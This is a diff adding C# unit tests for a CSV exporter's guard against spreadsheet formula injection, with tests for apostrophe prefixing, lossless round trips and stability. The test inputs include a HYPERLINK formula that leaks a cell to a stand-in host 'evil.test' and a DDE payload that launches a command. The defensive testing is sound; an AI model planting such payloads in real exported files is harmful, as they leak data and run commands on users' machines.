@@ -52,6 +52,93 @@ public sealed class CsvIdeaTests
         Assert.Equal("line\nbreak", back[2][1]);
     }
 
+    // CWE-1236 (formula injection). A cell beginning '=', '+', '-', '@', tab, or CR is evaluated
+    // as a formula by Excel/Sheets/LibreOffice on open, so idea content authored by any member
+    // could execute in an admin's spreadsheet. Csv.Write guards it; Csv.Parse strips the guard.
+    [Theory]
+    [InlineData("=HYPERLINK(\"http://evil.test?d=\"&A1,\"click\")")]
+    [InlineData("=cmd|'/c calc'!A1")]
+    [InlineData("+1+1")]
+    [InlineData("-2+3")]
+    [InlineData("@SUM(A1:A9)")]
+    [InlineData("\tleading tab")]
+    [InlineData("\rleading cr")]
+    public void Csv_Write_GuardsFormulaTriggeringCells(string dangerous)
+    {
+        var csv = Csv.Write(new[] { "Title" }, new[] { (IReadOnlyList<string>)new[] { dangerous } });
+
+        var dataLine = csv.Split("\r\n")[1];
+
+        // The payload must not be the first character of the emitted cell — quoted or not.
+        Assert.DoesNotContain($"\r\n{dangerous[0]}", csv);
+        Assert.StartsWith("'", dataLine.TrimStart('"'));
+    }
+
+    [Fact]
+    public void Csv_Write_LeavesOrdinaryCellsUnguarded()
+    {
+        var csv = Csv.Write(new[] { "Title" }, new[]
+        {
+            (IReadOnlyList<string>)new[] { "Reduce approval steps" },
+            new[] { "'tis a quoted phrase" },
+        });
+
+        Assert.Contains("\r\nReduce approval steps\r\n", csv);
+        // A value that genuinely starts with an apostrophe is not double-guarded.
+        Assert.Contains("\r\n'tis a quoted phrase\r\n", csv);
+    }
+
+    [Theory]
+    [InlineData("=1+1")]
+    [InlineData("-danger")]
+    [InlineData("@x")]
+    [InlineData("plain value")]
+    [InlineData("'tis a quoted phrase")]
+    [InlineData("has, comma")]
+    // Values that already look guarded. Without apostrophe-depth counting in the guard, the strip
+    // on re-import eats the user's own apostrophe and silently rewrites stored data.
+    [InlineData("'=1+1")]
+    [InlineData("''=1+1")]
+    [InlineData("'-2")]
+    [InlineData("''")]
+    [InlineData("'")]
+    [InlineData("")]
+    public void Csv_WriteThenParse_RoundTripsGuardedCellsLosslessly(string original)
+    {
+        var csv = Csv.Write(new[] { "Title" }, new[] { (IReadOnlyList<string>)new[] { original } });
+
+        var back = Csv.Parse(csv);
+
+        Assert.Equal(original, back[1][0]);
+    }
+
+    [Fact]
+    public void Csv_Parse_StripsGuardOnlyWhenWhatRemainsWouldHaveBeenGuarded()
+    {
+        var records = Csv.Parse("a\n'=1+1\n'tis\n''\n''=1+1");
+
+        Assert.Equal("=1+1", records[1][0]);    // guard removed
+        Assert.Equal("'tis", records[2][0]);    // ordinary leading apostrophe preserved
+        Assert.Equal("''", records[3][0]);      // apostrophes with no trigger behind them, preserved
+        Assert.Equal("'=1+1", records[4][0]);   // one guard removed, the user's own apostrophe kept
+    }
+
+    /// <summary>
+    /// The guard must survive a second pass through the exporter — an export of re-imported data
+    /// must not accumulate apostrophes, or repeated round trips would drift.
+    /// </summary>
+    [Theory]
+    [InlineData("=1+1")]
+    [InlineData("'=1+1")]
+    [InlineData("'tis")]
+    public void Csv_WriteParseWrite_IsStable(string original)
+    {
+        var once = Csv.Write(new[] { "T" }, new[] { (IReadOnlyList<string>)new[] { original } });
+        var twice = Csv.Write(new[] { "T" }, new[] { (IReadOnlyList<string>)new[] { Csv.Parse(once)[1][0] } });
+
+        Assert.Equal(once, twice);
+    }
+
     [Fact]
     public void IdeaParser_MapsCellsByHeader_CaseInsensitive_AndSkipsBlankRows()
     {
